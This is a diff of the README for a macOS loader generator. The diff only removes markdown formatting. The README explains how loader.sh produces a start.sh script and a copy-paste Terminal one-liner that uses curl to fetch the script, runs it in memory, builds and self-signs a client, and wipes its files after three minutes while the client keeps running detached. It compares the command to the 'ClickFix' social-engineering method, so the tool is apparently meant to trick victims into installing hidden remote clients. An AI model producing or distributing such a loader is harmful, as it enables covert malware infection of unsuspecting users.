@@ -12,10 +12,10 @@ It is a copy of the Client folder with all unnecessary files removed. Only the s
 ## How the generated start.sh works step by step:
 
 - Downloads the ZIP archive from the specified URL
-- Unzips it into the current directory, creating a **scr** folder
-- Enters the **scr** folder and runs **build.sh** (in the background)
+- Unzips it into the current directory, creating a scr folder
+- Enters the scr folder and runs build.sh (in the background)
 - Waits 3 minutes
-- Deletes all files inside **scr** and the ZIP file itself
+- Deletes all files inside scr and the ZIP file itself
 - The client continues running in a background process
 
 ## Requirements
@@ -25,19 +25,19 @@ It is a copy of the Client folder with all unnecessary files removed. Only the s
 
 ## Quick Start
 
-```bash
+```
 chmod +x loader.sh
 ./loader.sh
 ```
 
 The script will prompt you to enter:
 1. URL to the client ZIP file
-2. URL/path where **start.sh** will be hosted on the server
-3. Path to the **Client** folder (or the folder containing the client module)
+2. URL/path where start.sh will be hosted on the server
+3. Path to the Client folder (or the folder containing the client module)
 
-After that, the script will create the **start.sh** file in the current directory and output a ready-to-use terminal command. This command can be used similarly to the ClickFix method.
+After that, the script will create the start.sh file in the current directory and output a ready-to-use terminal command. This command can be used similarly to the ClickFix method.
 
-Upload **start.sh** to the server at the specified URL.
+Upload start.sh to the server at the specified URL.
 
 ## Examples
 
@@ -52,7 +52,7 @@ Example path to the client folder:
 
 ## Execution Result Example
 
-```bash
+```
 chmod +x loader.sh
 ./loader.sh
 Enter URL to ZIP file:
@@ -70,11 +70,10 @@ if [[ "$OSTYPE" != "darwin"* ]]; then exit 1; fi; /bin/bash -c "$(curl -fsSL htt
 
 ## Usage
 
-The user should copy and paste the displayed command into the Terminal on macOS. The command checks the OS and downloads/executes **start.sh** directly in memory. In turn, **start.sh** will:
+The user should copy and paste the displayed command into the Terminal on macOS. The command checks the OS and downloads/executes start.sh directly in memory. In turn, start.sh will:
 
 - Download the client ZIP
 - Compile the app, automatically installing all dependencies
 - Locally sign and run it
 
-After 3 minutes, **start.sh** deletes all client files from disk. The client continues running in a detached background child process.
-```
+After 3 minutes, start.sh deletes all client files from disk. The client continues running in a detached background child process.
